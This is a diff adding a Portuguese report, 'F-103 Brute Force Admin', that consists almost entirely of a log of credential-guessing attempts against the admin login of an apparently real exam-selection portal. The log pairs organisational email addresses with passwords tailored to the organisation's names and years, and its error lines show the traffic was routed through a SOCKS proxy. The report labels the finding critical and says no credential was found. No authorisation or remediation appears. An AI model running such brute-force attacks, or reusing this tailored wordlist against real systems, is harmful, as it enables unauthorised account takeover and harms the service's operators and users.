@@ -1,0 +1,72 @@
+# F-103 Brute Force Admin
+Alvo: https://ifes25-semproxy.selecao.net.br/admin/login/
+Timestamp: 2026-08-25T19:24:54Z
+Severidade: Crítica
+
+## Resultados
+
+Nenhuma credencial encontrada.
+
+## Estatísticas
+Total de tentativas: 2684
+Usuários testados: 22
+Senhas testadas: 122
+
+## Log de tentativas
+
+[  50] progress: last=gustavo@impactaweb.com.br:fadenor2025 -> 422
+[ 100] progress: last=gustavo@impactaweb.com.br:111111 -> 422
+[ 150] progress: last=admin@selecao.net.br:Fadenor@2024 -> 422
+[ 200] progress: last=admin@selecao.net.br:admin2023 -> 422
+[ 250] progress: last=cotec@selecao.net.br:ProSeleta -> 422
+[ 300] progress: last=cotec@selecao.net.br:proseleta2023 -> 422
+[ 350] progress: last=cotec@selecao.net.br:777777 -> 422
+[ 400] progress: last=fadenor@selecao.net.br:Fadenor@2024 -> 422
+[ 450] progress: last=fadenor@selecao.net.br:gustavo1234 -> 422
+[ 500] progress: last=proseleta@selecao.net.br:12345678 -> 422
+[ 550] progress: last=proseleta@selecao.net.br:gustavo123 -> 422
+[ 600] progress: last=proseleta@selecao.net.br:020202 -> 422
+[ 650] progress: last=suporte@selecao.net.br:adm2023 -> 422
+[ 700] progress: last=suporte@selecao.net.br:letmein -> 422
+[ 750] progress: last=gestao@selecao.net.br:impactaweb -> 422
+[ 800] progress: last=gestao@selecao.net.br:C0t3c2023 -> 422
+[ 850] progress: last=gestao@selecao.net.br:fadenoradmin -> 422
+[ 900] progress: last=painel@selecao.net.br:Admin@1234 -> 422
+[ 950] progress: last=painel@selecao.net.br:qwerty -> 422
+[1000] progress: last=coordenador@selecao.net.br:selecao2024 -> 422
+[1050] progress: last=coordenador@selecao.net.br:ProSeleta@2024 -> 422
+[1100] progress: last=secretaria@selecao.net.br:123456 -> 422
+[1150] progress: last=secretaria@selecao.net.br:Fadenor@2023 -> 422
+[1200] progress: last=secretaria@selecao.net.br:333333 -> 422
+[1250] progress: last=superadmin@selecao.net.br:adminifes -> 422
+[1300] progress: last=superadmin@selecao.net.br:Selecao123 -> 422
+[1350] progress: last=master@selecao.net.br:fadenor2023 -> 422
+[1400] progress: last=master@selecao.net.br:FADENOR2023 -> 422
+[1450] progress: last=master@selecao.net.br:999999 -> 422
+[1500] progress: last=rh@selecao.net.br:fadenor@2023 -> 422
+[1550] progress: last=rh@selecao.net.br:Gustavo2023 -> 422
+[1600] progress: last=ifes@selecao.net.br:senha123 -> 422
+[1650] progress: last=ifes@selecao.net.br:cotec@123 -> 422
+[1700] progress: last=ifes@selecao.net.br:painel -> 422
+[1750] progress: last=instituto@selecao.net.br:COTEC -> 422
+[1800] progress: last=instituto@selecao.net.br:dragon -> 422
+[1850] progress: last=selecao@selecao.net.br:admin2024 -> 422
+[1900] progress: last=selecao@selecao.net.br:1mpacta2023 -> 422
+[1950] progress: last=selecao@selecao.net.br:Selecao@123 -> 422
+[1952] ERROR selecao@selecao.net.br:Fadenor@2025 -> ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
+[1953] ERROR adm@selecao.net.br:admin -> SOCKSHTTPSConnectionPool(host='ifes25-semproxy.selecao.net.br', port=443): Max retries exceeded with url: /admin/login/ (Caused by NewConnectionError("SOCKSHTTPSConnection(host='ifes25-semproxy.selecao.net.br', port=443): Failed to establish a new connection: 0x01: General SOCKS server failure"))
+[2000] progress: last=adm@selecao.net.br:p@ssw0rd -> 422
+[2050] progress: last=adm@selecao.net.br:654321 -> 422
+[2100] progress: last=administrador@selecao.net.br:Proseleta@2023 -> 422
+[2150] progress: last=administrador@selecao.net.br:@dmin2024 -> 422
+[2200] progress: last=root@selecao.net.br:selecao -> 422
+[2250] progress: last=root@selecao.net.br:impacta@2024 -> 422
+[2300] progress: last=root@selecao.net.br:555555 -> 422
+[2350] progress: last=impacta@selecao.net.br:Proseleta@2023 -> 422
+[2400] progress: last=impacta@selecao.net.br:ProSeleta@2023 -> 422
+[2450] progress: last=admin@cotec.com.br:@dmin2023 -> 422
+[2481] ERROR admin@cotec.com.br:adm2024 -> ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
+[2500] progress: last=admin@cotec.com.br:impactaweb@2023 -> 422
+[2550] progress: last=admin@cotec.com.br:1234567890 -> 422
+[2600] progress: last=admin@ifes.edu.br:impacta@2023 -> 422
+[2650] progress: last=admin@ifes.edu.br:teste123 -> 422
